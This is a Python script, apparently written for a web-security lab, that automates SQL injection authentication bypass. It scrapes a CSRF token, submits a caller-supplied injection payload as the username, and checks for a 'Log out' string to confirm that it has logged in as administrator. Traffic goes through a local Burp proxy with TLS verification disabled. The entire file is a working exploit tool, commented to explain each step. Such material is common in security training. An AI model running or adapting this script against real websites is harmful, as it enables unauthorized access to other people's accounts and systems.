# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings
from bs4 import BeautifulSoup  # For parsing HTML content

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to retrieve CSRF token from the target website
def get_csrf_token(s, url):
    # Send a GET request to the target URL
    r = s.get(url, verify=False, proxies=proxies)
    
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Find the CSRF token from the input element's 'value' attribute
    csrf = soup.find("input")['value']
    return csrf

# Function to exploit SQL injection and perform unauthorized login
def exploit_sqli(s, url, payload):
    # Get the CSRF token from the target website
    csrf = get_csrf_token(s, url)
    
    # Create data payload for the POST request
    data = {
        "csrf": csrf,       # CSRF token
        "username": payload,  # SQL injection payload
        "password": "randomtext"  # Random password (not used in the exploit)
    }

    # Send a POST request to the target URL with the data payload
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    
    # Check if the response indicates successful unauthorized login
    if "Log out" in res:
        return True  # Successful exploitation and unauthorized login
    else:
        return False  # Exploitation was unsuccessful

# Main program execution block
if __name__ == "__main__":
    try:
        # Get target URL and SQL injection payload from command-line arguments
        url = sys.argv[1].strip()  # URL of the vulnerable web application
        sqli_payload = sys.argv[2].strip()  # SQL injection payload
        
    except IndexError:
        # Print usage instructions and exit if arguments are missing
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    # Create a session object for maintaining state across requests
    s = requests.Session()

    # Attempt SQL injection and unauthorized login using the provided URL and payload
    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')